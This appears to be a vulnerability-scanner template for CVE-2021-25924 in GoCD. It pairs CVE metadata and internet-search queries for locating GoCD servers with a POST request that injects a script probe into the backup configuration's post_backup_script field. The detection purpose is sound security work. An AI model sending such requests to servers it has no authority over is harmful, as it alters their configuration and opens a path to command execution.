id: CVE-2021-25924

info:
  name: GoCD CSRF Vulnerability in Backup Configuration
  author: ProjectDiscoveryAI
  severity: high
  description: |
    In GoCD, versions 19.6.0 to 21.1.0 are vulnerable to Cross-Site Request Forgery due to missing CSRF protection at the `/go/api/config/backup` endpoint. An attacker can trick a victim to click on a malicious link which could change backup configurations or execute system commands in the post_backup_script field.
  impact: |
    An attacker can exploit this vulnerability to perform unauthorized actions on the GoCD server.
  remediation: |
    Upgrade GoCD to the latest version to mitigate the CSRF vulnerability in Backup Configuration (CVE-2021-25924).
  reference:
    - https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25924%2C
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2021-25924
    cwe-id: CWE-352
    epss-score: 0.00071
    epss-percentile: 0.32666
    cpe: cpe:2.3:a:thoughtworks:gocd:*:*:*:*:*:*:*:*
  metadata:
    vendor: thoughtworks
    product: gocd
    shodan-query: html:"GoCD Version"
    fofa-query:
      - body="gocd version"
      - title="create a pipeline - go" html:"gocd version"
    google-query: intitle:"create a pipeline - go" html:"gocd version"

http:
  - method: POST
    path:
      - "{{BaseURL}}/go/api/config/backup"

    headers:
      Accept: "application/vnd.go.cd.v1+json"

    body: |
      {
        "schedule": null,
        "post_backup_script": "\"><script>alert(1)</script>",
        "email_on_success": false,
        "email_on_failure": false
      }
    matchers:
      - type: word
        words:
          - "<script>alert(1)</script>"
        part: body
